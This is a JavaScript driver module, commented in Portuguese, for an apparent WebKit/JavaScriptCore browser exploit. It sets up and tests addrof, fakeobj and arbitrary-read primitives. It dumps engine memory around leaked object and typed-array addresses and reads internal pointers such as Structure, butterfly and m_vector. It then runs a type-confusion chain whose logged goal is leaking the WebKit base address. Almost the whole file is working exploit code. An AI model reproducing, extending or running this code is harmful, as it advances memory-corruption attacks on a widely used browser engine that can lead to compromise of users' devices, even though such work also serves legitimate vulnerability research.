// js/main.mjs

import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './script3/testArrayBufferVictimCrash.mjs';
import { AdvancedInt64, setLogFunction, toHex, isAdvancedInt64Object } from './utils.mjs'; // isAdvancedInt64Object importado aqui
import { JSC_OFFSETS } from './config.mjs';
import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read, fakeobj_core } from './core_exploit.mjs';

// --- Local DOM Elements Management ---
const elementsCache = {};

function getElementById(id) {
    if (elementsCache[id] && document.body.contains(elementsCache[id])) {
        return elementsCache[id];
    }
    const element = document.getElementById(id);
    if (element) {
        elementsCache[id] = element;
    }
    return element;
}

// --- Local Logging Functionality (formerly from logger.mjs and s3_utils.mjs) ---
const outputDivId = 'output-advanced';

// Local log function that will be passed to modules
export const log = (message, type = 'info', funcName = '') => {
    const outputDiv = getElementById(outputDivId);
    if (!outputDiv) {
        console.error(`Log target div "${outputDivId}" not found. Message: ${message}`);
        return;
    }
    try {
        const timestamp = `[${new Date().toLocaleTimeString()}]`;
        const prefix = funcName ? `[${funcName}] ` : '';
        const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
        const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'debug'].includes(type) ? type : 'info';

        if (outputDiv.innerHTML.length > 600000) {
            const lastPart = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 300000);
            outputDiv.innerHTML = `<span class="log-info">[${new Date().toLocaleTimeString()}] [Log Truncado...]</span>\n` + lastPart;
        }

        outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`;
        outputDiv.scrollTop = outputDiv.scrollHeight;
    } catch (e) {
        console.error(`Error in logToDiv for ${outputDivId}:`, e, "Original message:", message);
        if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`;
    }
};

// --- Local Pause Functionality (formerly from utils.mjs and s3_utils.mjs) ---
const SHORT_PAUSE = 50;
const MEDIUM_PAUSE = 500;
const LONG_PAUSE = 1000;

const PAUSE = async (ms = SHORT_PAUSE) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// --- JIT Behavior Test ---
async function testJITBehavior() {
    log("--- Iniciando Teste de Comportamento do JIT ---", 'test', 'testJITBehavior');
    let test_buf = new ArrayBuffer(16);
    let float_view = new Float64Array(test_buf);
    let uint32_view = new Uint32Array(test_buf);
    let some_obj = { a: 1, b: 2 };

    log("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
    float_view[0] = some_obj;

    const low = uint32_view[0];
    const high = uint32_view[1];
    const leaked_val = new AdvancedInt64(low, high);

    log(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor completo: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');

    if (high === 0x7ff80000 && low === 0) {
        log("CONFIRMADO: O JIT converteu o objeto para NaN, como esperado.", 'good', 'testJITBehavior');
    } else {
        log("INESPERADO: O JIT não converteu para NaN. O comportamento é diferente do esperado.", 'warn', 'testJITBehavior');
    }
    log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
}

// --- NOVO: Teste Isolado da Primitiva addrof_core e fakeobj_core com objeto simples e DUMP DE MEMÓRIA (AGORA COM UINT8ARRAY) ---
// AGORA PASSANDO isAdvancedInt64Object COMO ARGUMENTO
async function testIsolatedAddrofFakeobjCoreAndDump(logFn, pauseFn, JSC_OFFSETS_PARAM, isAdvancedInt64ObjectFn) {
    const FNAME = 'testIsolatedAddrofFakeobjCoreAndDump';
    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core / fakeobj_core, leitura de Structure*, e DUMP DE MEMÓRIA de OBJETO JS E UINT8ARRAY ---`, 'test', FNAME);

    let addrof_success = false;
    let fakeobj_success = false;
    let rw_test_on_fakeobj_success = false;
    let structure_ptr_found = false;
    let contents_ptr_leaked = false; // Flag para o ponteiro de conteúdo do ArrayBuffer

    try {
        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
        initCoreAddrofFakeobjPrimitives();
        await pauseFn(SHORT_PAUSE);

        // --- Teste addrof_core e fakeobj_core para OBJETO JS SIMPLES ---
        const test_object_original = { p1: 0x11223344, p2: 0xAABBCCDD, p3_low: 0xDEADBEEF, p3_high: 0xCAFE0000 };
        logFn(`Criado objeto de teste original (JS Simples): ${JSON.stringify(test_object_original)}`, 'info', FNAME);
        const object_addr_simple = addrof_core(test_object_original);
        logFn(`Endereço retornado por addrof_core (untagged, JS Simples): ${object_addr_simple.toString(true)}`, 'leak', FNAME);

        if (object_addr_simple.equals(AdvancedInt64.Zero) || object_addr_simple.equals(AdvancedInt64.NaNValue)) {
            logFn(`ERRO: addrof_core retornou endereço inválido para test_object_original.`, 'error', FNAME);
            throw new Error("addrof_core returned invalid address for simple JS object.");
        }
        addrof_success = true; // addrof funciona para objeto simples.

        const faked_object = fakeobj_core(object_addr_simple);
        if (faked_object && typeof faked_object === 'object') {
            faked_object.p1 = 0xDEADC0DE;
            if (test_object_original.p1 === 0xDEADC0DE) {
                logFn(`SUCESSO: Leitura/Escrita via fakeobj para objeto JS simples confirmada.`, 'good', FNAME);
                rw_test_on_fakeobj_success = true;
            } else {
                logFn(`FALHA: Leitura/Escrita via fakeobj para objeto JS simples falhou.`, 'error', FNAME);
            }
        } else {
            logFn(`FALHA: Criação de fakeobj para objeto JS simples falhou.`, 'error', FNAME);
        }
        await pauseFn(SHORT_PAUSE);


        // --- DUMP DE MEMÓRIA DO OBJETO JS SIMPLES ---
        logFn(`--- INICIANDO DUMP DE MEMÓRIA do objeto JS simples em ${object_addr_simple.toString(true)} ---`, 'subtest', FNAME);
        const DUMP_SIZE_JS_OBJ = 0x100; // Dump 256 bytes do objeto JS
        let dump_log_js_obj = `\n--- DUMP DO OBJETO JS SIMPLES EM ${object_addr_simple.toString(true)} ---\n`;
        dump_log_js_obj += `Offset    Hex (64-bit)       Decimal (Low) Hex (32-bit Low) Hex (32-bit High) Content Guess\n`;
        dump_log_js_obj += `-------- -------------------- ------------- ------------------ ------------------ -------------------\n`;

        for (let offset = 0; offset < DUMP_SIZE_JS_OBJ; offset += 8) {
            try {
                const current_read_addr = object_addr_simple.add(offset);
                const val = await arb_read(current_read_addr, 8); // Ler como AdvancedInt64
                let guess = "";

                if (isAdvancedInt64ObjectFn(val)) {
                    if (val.equals(AdvancedInt64.Zero)) {
                        guess = "Zero/Null";
                    } else if (val.high() === 0x7ff80000 && val.low() === 0) {
                        guess = "NaN (JS Empty Slot)";
                    } else {
                        if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
                            guess = `*** JSCell Structure* PTR (expected 0x8) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) structure_ptr_found = true;
                        } else if (offset === JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET) {
                            guess = `*** JSObject BUTTERFLY PTR (expected 0x10) ***: ${val.toString(true)}`;
                        } else if (val.low() === test_object_original.p1 && val.high() === 0) {
                            guess = `JSObject Prop 'p1': ${val.low()}`;
                        } else if (val.low() === test_object_original.p2 && val.high() === 0) {
                            guess = `JSObject Prop 'p2': ${val.low()}`;
                        } else if (val.low() === test_object_original.p3_low && val.high() === test_object_original.p3_high) {
                             guess = `JSObject Prop 'p3' (AdvInt64)`;
                        } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) { // Tentativa de detectar JSValue Tag
                            const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
                            guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
                        } else {
                            guess = `Raw Value: ${val.toString(true)}`;
                        }
                    }
                } else {
                    guess = `Non-AdvInt64 Value (Typeof: ${typeof val}): ${String(val)}`;
                }

                dump_log_js_obj += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ${val.toString(true).padStart(19, ' ')} ${String(val.low()).padStart(13, ' ')} 0x${val.low().toString(16).padStart(8,'0')} 0x${val.high().toString(16).padStart(8,'0')} ${guess}\n`;

            } catch (e_dump) {
                dump_log_js_obj += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ERROR in arb_read: ${e_dump.message}\n`;
                logFn(`[${FNAME}] ERRO durante dump (JS Obj) no offset 0x${offset.toString(16)}: ${e_dump.message}`, 'error', FNAME);
            }
        }
        logFn(dump_log_js_obj, 'leak', FNAME);
        logFn(`--- FIM DO DUMP DE MEMÓRIA (OBJETO JS SIMPLES) ---`, 'subtest', FNAME);
        await pauseFn(LONG_PAUSE * 2); // Pausa longa para revisar o dump


        // --- DUMP DE MEMÓRIA DE UM UINT8ARRAY ---
        const DUMP_ARRAY_SIZE = 0x1000; // 4KB para ter um m_vector alocado no heap
        const test_uint8_array_to_dump = new Uint8Array(DUMP_ARRAY_SIZE);
        for (let i = 0; i < DUMP_ARRAY_SIZE; i++) {
            test_uint8_array_to_dump[i] = (i % 255); // Preencher com um padrão previsível
        }
        logFn(`Criado Uint8Array de teste para dump (tamanho ${DUMP_ARRAY_SIZE} bytes) e preenchido com padrão.`, 'info', FNAME);
        await pauseFn(SHORT_PAUSE);

        logFn(`Obtendo endereço do Uint8Array de teste para dump usando addrof_core...`, 'info', FNAME);
        const uint8_array_addr = addrof_core(test_uint8_array_to_dump);
        logFn(`Endereço retornado por addrof_core (untagged, do Uint8Array): ${uint8_array_addr.toString(true)}`, 'leak', FNAME);

        let dump_log_uint8_array = `\n--- DUMP DO UINT8ARRAY EM ${uint8_array_addr.toString(true)} ---\n`;
        dump_log_uint8_array += `Offset    Hex (64-bit)       Decimal (Low) Hex (32-bit Low) Hex (32-bit High) Content Guess\n`;
        dump_log_uint8_array += `-------- -------------------- ------------- ------------------ ------------------ -------------------\n`;

        for (let offset = 0; offset < DUMP_SIZE_JS_OBJ; offset += 8) { // Usar o mesmo tamanho de dump para comparação
            try {
                const current_read_addr = uint8_array_addr.add(offset);
                const val = await arb_read(current_read_addr, 8); // Ler como AdvancedInt64
                let guess = "";

                if (isAdvancedInt64ObjectFn(val)) {
                    if (val.equals(AdvancedInt64.Zero)) {
                        guess = "Zero/Null";
                    } else if (val.high() === 0x7ff80000 && val.low() === 0) {
                        guess = "NaN (JS Empty Slot)";
                    } else {
                        if (offset === JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET) {
                            guess = `*** JSCell Structure* PTR (expected 0x8) ***: ${val.toString(true)}`;
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.ASSOCIATED_ARRAYBUFFER_OFFSET) {
                            guess = `*** ABView ASSOCIATED_ARRAYBUFFER PTR (expected 0x8) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) contents_ptr_leaked = true; // Confirma o vazamento do ponteiro do conteúdo
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET) {
                            guess = `*** ABView M_VECTOR PTR (expected 0x10) ***: ${val.toString(true)}`;
                            if (!val.equals(AdvancedInt64.Zero) && !val.equals(AdvancedInt64.NaNValue)) contents_ptr_leaked = true; // Confirma o vazamento do ponteiro do m_vector
                        } else if (offset === JSC_OFFSETS_PARAM.ArrayBufferView.M_LENGTH_OFFSET) {
                            guess = `ABView M_LENGTH (expected 0x18): ${val.low()}`;
                        } else if ((val.high() & 0xFFFF0000) === 0x402A0000 || (val.high() & 0xFFFF0000) === 0x001D0000) {
                            const potential_obj_ptr = new AdvancedInt64(val.low(), val.high() & 0x0000FFFF);
                            guess = `JSValue (Tagged Ptr to ${potential_obj_ptr.toString(true)})`;
                        } else {
                            guess = `Raw Value: ${val.toString(true)}`;
                        }
                    }
                } else {
                    guess = `Non-AdvInt64 Value (Typeof: ${typeof val}): ${String(val)}`;
                }

                dump_log_uint8_array += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ${val.toString(true).padStart(19, ' ')} ${String(val.low()).padStart(13, ' ')} 0x${val.low().toString(16).padStart(8,'0')} 0x${val.high().toString(16).padStart(8,'0')} ${guess}\n`;

            } catch (e_dump) {
                dump_log_uint8_array += `${toHex(offset, 16).padStart(8, '0').slice(2)}: ERROR in arb_read: ${e_dump.message}\n`;
                logFn(`[${FNAME}] ERRO durante dump (Uint8Array) no offset 0x${offset.toString(16)}: ${e_dump.message}`, 'error', FNAME);
            }
        }
        logFn(dump_log_uint8_array, 'leak', FNAME);
        logFn(`--- FIM DO DUMP DE MEMÓRIA (UINT8ARRAY) ---`, 'subtest', FNAME);
        await pauseFn(LONG_PAUSE * 2);

        // A avaliação final de structure_ptr_found e contents_ptr_leaked
        // já é feita dentro dos loops de dump.

    } catch (e) {
        logFn(`ERRO CRÍTICO no teste isolado de addrof/fakeobj_core e dump de memória: ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME);
        addrof_success = false;
        fakeobj_success = false;
        rw_test_on_fakeobj_success = false;
        structure_ptr_found = false;
        contents_ptr_leaked = false;
    } finally {
        logFn(`--- Teste Isolado da Primitiva addrof_core / fakeobj_core e Dump de Memória Concluído ---`, 'test', FNAME);
        logFn(`Resultados: Addrof: ${addrof_success}, Fakeobj Criação: ${fakeobj_success}, Leitura/Escrita via Fakeobj: ${rw_test_on_fakeobj_success}, Structure* Ponteiro Encontrado (em JS Simples): ${structure_ptr_found}, Conteúdo/m_vector Ponteiro Vazado (em Uint8Array): ${contents_ptr_leaked}`, 'info', FNAME);
    }
    // Retorna true apenas se as primitivas base e o vazamento do ponteiro de conteúdo do AB funcionarem
    return addrof_success && fakeobj_success && rw_test_on_fakeobj_success && contents_ptr_leaked;
}


// --- Main Heisenbug Reproduction Strategy (formerly from runAllAdvancedTestsS3.mjs) ---
async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43";
    log(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43(log, PAUSE, JSC_OFFSETS);

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        log(`  RUNNER R43(L): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        log(`  RUNNER R43(L): Completou. Melhor OOB usado: ${result.oob_value_of_best_result || 'N/A'}`, "good", FNAME_RUNNER);
        log(`  RUNNER R43(L): Detalhes Sonda TC (Best): ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result;
        const addrofResult = result.addrof_result;
        const webkitLeakResult = result.webkit_leak_result;

        log(`  RUNNER R43(L): Heisenbug TC Sonda (Best): ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (addrofResult) {
            log(`  RUNNER R43(L): Teste Addrof (Best): ${addrofResult.msg} (Endereço vazado: ${addrofResult.leaked_object_addr || addrofResult.leaked_object_addr_candidate_str || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste Addrof não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            log(`  RUNNER R43(L): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkitBaseAddress || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
        } else {
            log(`  RUNNER R43(L): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult?.success) {
            document.title = `${module_name_for_title}_R43L: WebKitLeak SUCCESS!`;
        } else if (addrofResult?.success) {
            document.title = `${module_name_for_title}_R43L: Addrof OK, WebKitLeak Fail`;
        } else if (heisenbugSuccessfullyDetected) {
            document.title = `${module_name_for_title}_R43L: TC OK, Addrof/WebKitLeak Fail`;
        } else {
            document.title = `${module_name_for_title}_R43L: No TC Confirmed`;
        }
    } else {
        document.title = `${module_name_for_title}_R43L: Invalid Result Obj`;
    }
    log(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE(MEDIUM_PAUSE);
    log(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}


// --- Initialization Logic ---
function initializeAndRunTest() {
    const runBtn = getElementById('runIsolatedTestBtn');
    const outputDiv = getElementById('output-advanced');

    // Set the log function in utils.mjs so core_exploit.mjs can use it
    setLogFunction(log);

    if (!outputDiv) {
        console.error("DIV 'output-advanced' not found. Log will not be displayed on the page.");
    }

    if (runBtn) {
        runBtn.addEventListener('click', async () => {
            if (runBtn.disabled) return;
            runBtn.disabled = true;

            if (outputDiv) {
                outputDiv.innerHTML = ''; // Clear previous logs
            }
            console.log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...");
            log("Starting isolated test: Attempting to Reproduce Getter Trigger in MyComplexObject...", 'test');

            try {
                // Execute JIT test first
                await testJITBehavior();
                await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log

                // NOVO: Teste isolado das primitivas addrof_core e fakeobj_core com dump de memória
                // Passando isAdvancedInt64Object como um argumento para a função
                const addrof_fakeobj_dump_test_passed = await testIsolatedAddrofFakeobjCoreAndDump(log, PAUSE, JSC_OFFSETS, isAdvancedInt64Object);
                if (!addrof_fakeobj_dump_test_passed) {
                    log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
                    runBtn.disabled = false;
                    return;
                }
                log("Teste isolado das primitivas addrof_core/fakeobj_core e dump de memória concluído com sucesso. Prosseguindo para a cadeia principal.", 'good');
                await PAUSE(LONG_PAUSE * 2); // Pausa mais longa para revisar logs do dump

                // Then run the main exploit strategy
                await runHeisenbugReproStrategy_TypedArrayVictim_R43();
            } catch (e) {
                console.error("Critical error during isolated test execution:", e);
                log(`[CRITICAL TEST ERROR] ${String(e.message).replace(/</g, "&lt;").replace(/>/g, "&gt;")}\n`, 'critical');
            } finally {
                console.log("Isolated test concluded.");
                log("Isolated test finished. Check the console for more details, especially if the browser crashed or a RangeError occurred.\n", 'test');
                runBtn.disabled = false;
                if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) && !document.title.includes("SUCCESS") && !document.title.includes("Fail") && !document.title.includes("OK") && !document.title.includes("Confirmed")) {
                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43L Done`;
                }
            }
        });
    } else {
        console.error("Button 'runIsolatedTestBtn' not found.");
    }
}

// Ensure DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAndRunTest);
} else {
    initializeAndRunTest();
}
